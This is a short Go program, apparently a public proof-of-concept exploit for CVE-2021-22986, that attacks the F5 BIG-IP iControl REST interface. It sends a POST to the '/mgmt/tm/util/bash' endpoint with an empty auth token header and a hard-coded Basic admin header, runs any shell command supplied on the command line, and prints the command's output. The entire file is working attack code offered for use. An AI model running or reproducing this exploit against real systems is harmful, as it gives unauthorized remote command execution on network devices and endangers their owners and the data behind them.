package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	"crypto/tls"
	"time"
	"bytes"
	"regexp"
	"strings"
	"flag"
)

func main(){

	var host,cmd string
	flag.StringVar(&host,"u","","URL: http://127.0.0.1")
	flag.StringVar(&cmd,"c","","CMD: id")
	flag.Parse()
	if host == "" || cmd == ""{
		fmt.Println(`
███████╗███████╗    ██████╗  ██████╗███████╗
██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝
█████╗  ███████╗    ██████╔╝██║     █████╗  
██╔══╝  ╚════██║    ██╔══██╗██║     ██╔══╝  
██║     ███████║    ██║  ██║╚██████╗███████╗
╚═╝     ╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
 CVE-2021-22986     Author: @yuyan-sec`)
	}else{
		exp(host,cmd)
	}

}

func exp(url, cmd string){
	t := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	c := &http.Client{
		Transport: t,
		Timeout:   5 * time.Second,
	}

	url = strings.TrimRight(url,"/")
	url = url + "/mgmt/tm/util/bash"

	payload := []byte("{\"command\": \"run\", \"utilCmdArgs\": \"-c "+ cmd +"\"}")

	r, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("X-F5-Auth-Token", "")
	r.Header.Set("Authorization", "Basic YWRtaW46")

	resp, err := c.Do(r)
	if err != nil{
		return
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil{
		return
	}

	if resp.StatusCode == 200{
		reg := regexp.MustCompile(`"commandResult":"(.*?)\\n`)
		commandResult := reg.FindAllStringSubmatch(string(body),-1)
		result := commandResult[0][1]
		result = strings.Replace(result,"context=system_u:system_r:initrc_t:s0","",-1)

		fmt.Println(result)
	}else{
		fmt.Println("fail")
	}

}